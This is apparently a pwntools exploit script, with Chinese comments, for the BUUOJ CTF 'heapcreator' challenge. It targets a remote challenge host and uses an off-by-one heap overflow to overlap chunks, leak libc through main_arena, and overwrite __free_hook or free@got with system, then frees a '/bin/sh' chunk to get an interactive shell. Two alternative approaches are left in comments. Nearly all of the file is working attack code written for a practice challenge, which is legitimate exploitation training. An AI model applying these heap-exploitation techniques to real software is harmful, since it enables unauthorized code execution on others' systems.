from pwn import *
from LibcSearcher import *
p = remote('node4.buuoj.cn', 26882)
# p = process('./heapcreator')
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

e = ELF('./heapcreator')
one_gadget = 0x4526a

def create(size: int, content: bytes):
    p.sendlineafter(b'Your choice :', b'1')
    p.sendlineafter(b'Size of Heap : ', str(size).encode())
    p.sendafter(b'Content of heap:', content)

def edit(index: int, content: bytes):
    p.sendlineafter(b'Your choice :', b'2')
    p.sendlineafter(b'Index :', str(index).encode())
    p.sendafter(b'Content of heap : ', content)

def show(index: int):
    p.sendlineafter(b'Your choice :', b'3')
    p.sendlineafter(b'Index :', str(index).encode())
    
def delete(index: int):
    p.sendlineafter(b'Your choice :', b'4')
    p.sendlineafter(b'Index :', str(index).encode())

# ================ 以下又是本人错误的尝试(*^_^*) ==================
# create(0x18) # id 0
# create(0x80) # id 1
# create(0x18) # id 2
# create(0x60) # id 3
# create(0x10) # id 4
# edit(0, b'a'*0x18 + b'\xb1')
# delete(0)
# delete(1)
# create(0x80) # id 0
# create(0xa0) # id 1
# delete(0)
# show(1)
# p.recvuntil(b'Content :')
# main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x58
# p.success(hex(main_arena))
# malloc_hook = main_arena - 0x10
# libc_base = malloc_hook - libc.sym['__malloc_hook']
# system = libc_base + libc.sym['system']

# # change free@got
# edit(2, b'a'*0x18 + b'\x91')
# delete(3)
# delete(2)
# create(0x80) # id 2
# edit(2, b'a'*0x20 + p64(malloc_hook-0x23))

# create(0x60) # id 3
# create(0x60) # id 5, fake chunk
# edit(5, b'a'*0x13 + p64(libc_base + one_gadget))
# create(0x10)


# ==================== [大佬](https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#0x03E-hitcontraining-heapcreator-off-by-one-chunk-overlapping)的解法：还是通过__malloc_hook泄露libc，然后修改free@got=================================
libc = ELF('../libcs/ubuntu16/x64/libc-2.23.so')
create(0x68, b'arttnba3') # id 0
create(0x60, b'arttnba3') # id 1
create(0x30, b'arttnba3') # id 2
create(0x60, b'arttnba3') # id 3
create(0x10, b'/bin/sh\x00') # id 4
edit(0, b'\x00' * 0x68 + p8(0xf1))
delete(1)
create(0x40,b'arttnba3') # id 1
show(1)
main_arena = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 88
__malloc_hook = main_arena - 0x10
libc_base = __malloc_hook - libc.sym['__malloc_hook']
log.success('libc base: ' + hex(libc_base))
create(0x10, p64(0xdeadbeef) + p64(libc_base + libc.sym['__free_hook'])) # id 5
edit(2, p64(libc_base + libc.sym['system']))
delete(4)
p.interactive()

# ==================== 另一种更好理解的解法：泄露free@got内容，获取libc，然后改写free@got为system====================
# 利用点就在edit与show函数有个读入地址的操作，而我们通过chunk覆盖的方式能够修改那个地址

# create(0x18, b'zyleoctf') # id 0
# create(0x10, b'zyleoctf') # id 1
# create(0x10, b'zyleoctf') # id 2

# edit(0, b'/bin/sh\x00'.ljust(0x18, b'a') + b'\x81')
# delete(1)
# '''
# 下面的p64(0x2)还是很关键的，根据运行结果，free@got与system地址有3字节的差别，因此这里写入的size最小为2（因为有off-by-one）
# 如果粗心的话，这里写成b'a'*8，服务端在调用read(, , 0x61616161)的时候就会出错。

# [+] free addr: 0x7f039f43c4f0
# [+] ubuntu-xenial-amd64-libc6 (id libc6_2.23-0ubuntu10_amd64) be choosed.
# [+] system addr: 0x7f039f3fd390

# '''
# create(0x70, b'a'*0x40 + p64(0x2) + p64(e.got['free'])) # id 1
# show(2)
# free_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
# p.success("free addr: " + hex(free_addr))
# libc = LibcSearcher('free', free_addr)
# libc_base = free_addr - libc.dump('free')
# system = libc_base + libc.dump('system')
# p.success("system addr: " + hex(system))

# edit(2, p64(system))
# delete(0)

# p.interactive()




